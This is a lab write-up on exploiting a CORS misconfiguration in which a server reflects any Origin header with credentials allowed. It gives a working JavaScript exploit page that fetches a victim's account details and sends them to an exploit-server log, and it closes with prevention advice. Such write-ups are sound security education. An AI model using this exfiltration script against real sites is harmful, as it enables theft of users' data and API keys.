# CORS Vulnerability with Basic Origin Reflection

## Lab Overview

This lab demonstrates a **Cross-Origin Resource Sharing (CORS) misconfiguration** where the server reflects the value of the `Origin` header without validating it.

Because of this behavior, any attacker-controlled origin can be trusted by the server. If the response also allows credentials, a malicious website can make authenticated requests using the victim’s browser and read sensitive data from the vulnerable application.

The objective of this lab is to **exploit the CORS misconfiguration to retrieve Carlos's API key from the `/accountDetails` endpoint**.

---

# What is CORS?

CORS (Cross-Origin Resource Sharing) is a browser security mechanism that allows a web application running on one origin to request resources from a different origin.

Browsers normally enforce the **Same-Origin Policy (SOP)** which blocks JavaScript from reading responses from different origins.

CORS relaxes this restriction when the server explicitly allows it using special HTTP headers.

Example request from a different origin:

http
GET /accountDetails HTTP/1.1
Host: vulnerable-website.com
Origin: https://attacker.com
Server response:

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker.com
When the browser sees this header, it allows JavaScript from that origin to read the response.

Vulnerability Explanation
In this lab, the server reflects the Origin header directly in the response.

Example request:

GET /accountDetails HTTP/1.1
Host: LAB-ID.web-security-academy.net
Origin: https://evil.com
Cookie: session=xyz
Server response:

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
This behavior is insecure because:

The server trusts any origin sent by the client.
Since Access-Control-Allow-Credentials: true is enabled, the browser will include the victim’s session cookies when making the request.

This allows attackers to read sensitive account data.

Sensitive Endpoint
The vulnerable endpoint in the lab is:

/accountDetails
This endpoint returns information about the logged-in user.

Example response:

{
  "username": "carlos",
  "email": "carlos@example.com",
  "apikey": "abc123xyz"
}
The goal of the attack is to steal the API key from this response.

Identifying the Vulnerability
Using Burp Suite:

Intercept a request to the account details endpoint.

Modify the request by adding a malicious origin.

Example request:

GET /accountDetails HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=xyz
Origin: https://attacker.com
If the response contains:

Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
then the application is vulnerable.

Exploitation Strategy
The attack works as follows:

1. Victim visits attacker-controlled website
2. JavaScript on attacker site sends a request to the vulnerable endpoint
3. Browser includes victim's session cookie
4. Server reflects attacker origin in CORS header
5. Browser allows attacker script to read the response
6. Stolen data is sent to attacker server
Exploit Code
The exploit uses JavaScript fetch() to request the sensitive endpoint and then sends the response to the attacker's server.

Example exploit script:

``<script>
fetch("https://LAB-ID.web-security-academy.net/accountDetails", {
    credentials: "include"
})
.then(function(response){
    return response.text();
})
.then(function(data){
    fetch("https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?data=" + encodeURIComponent(data));
});
</script>``
Explanation:

fetch() → sends request to vulnerable endpoint
credentials: include → includes victim cookies
response.text() → reads the response body
second fetch() → sends stolen data to attacker server
Full Exploit Page
The exploit page that should be hosted on the exploit server:

#<html>
<body>
<script>
fetch("https://LAB-ID.web-security-academy.net/accountDetails", {
    credentials: "include"
})
.then(function(response){
    return response.text();
})
.then(function(data){
    fetch("https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?data=" + encodeURIComponent(data));
});
</script>
</body>
#</html>

Delivering the Attack
Steps to complete the attack:

1. Place the exploit code in the exploit server
2. Click "Deliver exploit to victim"
3. Victim visits attacker page
4. Browser sends authenticated request to vulnerable site
5. Server reflects attacker origin
6. Browser allows attacker script to read the response
7. Sensitive data is sent to attacker server
Retrieving the API Key
Open the Exploit Server Access Log.

You will see a request containing the response data:

/log?data={"username":"carlos","apikey":"abc123xyz"}
Extract the API key and submit it to the lab to solve it.

Root Cause
The vulnerability exists because the server performs basic origin reflection.

Example insecure logic:

Access-Control-Allow-Origin = request.origin
No validation is performed to ensure that the origin is trusted.

Security Impact
If this vulnerability exists in a real-world application, attackers could:

Read private API responses
Steal user data
Steal API keys
Access account information
Exfiltrate sensitive data
All of this can happen without the user noticing anything.

Prevention
Secure CORS configuration requires strict origin validation.

Best practices:

1. Use a strict whitelist of trusted origins
2. Never reflect the Origin header dynamically
3. Avoid enabling credentials for untrusted origins
4. Validate origin values on the server side
Example secure configuration:

Access-Control-Allow-Origin: https://trusted-app.com
Access-Control-Allow-Credentials: true
Key Takeaway
This lab demonstrates how a CORS misconfiguration with basic origin reflection can allow attackers to bypass the Same-Origin Policy and steal sensitive data.

Attack chain:

Attacker website → sends cross-origin request
Browser includes victim cookies
Server reflects attacker origin
Browser allows response access
Attacker steals API key
Because the server trusted any origin, the attacker was able to access Carlos's API key and successfully solve the lab.
